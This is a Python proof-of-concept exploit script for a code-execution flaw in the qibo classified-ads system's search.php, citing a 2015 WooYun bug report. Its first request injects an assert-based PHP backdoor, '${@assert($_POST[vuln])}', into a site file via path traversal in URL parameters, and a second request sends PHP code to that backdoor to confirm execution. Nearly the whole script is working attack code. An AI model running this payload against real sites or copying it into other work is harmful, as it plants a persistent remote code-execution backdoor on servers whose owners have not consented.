#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: qibo分类系统search.php 代码执行
referer: http://www.wooyun.org/bugs/wooyun-2015-0122599
author: Lucifer
description: search.php代码执行。
'''
import sys
import json
import requests
import warnings
def run(url):
        result = ['qibo分类系统search.php 代码执行','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/new/fenlei/search.php?mid=1&action=search&keyword=asd&postdb[city_id]=../../admin/hack&hack=jfadmin&action=addjf&Apower[jfadmin_mod]=1&fid=1&title=${@assert($_POST[vuln])}"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            vulnurl = url + "/do/jf.php"
            post_data = {
                "vuln":"phpinfo();"
            }
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"Configuration File (php.ini) Path" in req.text:
                result[2]=  '存在'
                result[1]=vulnurl+"\npost: "+json.dumps(post_data, indent=4)
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
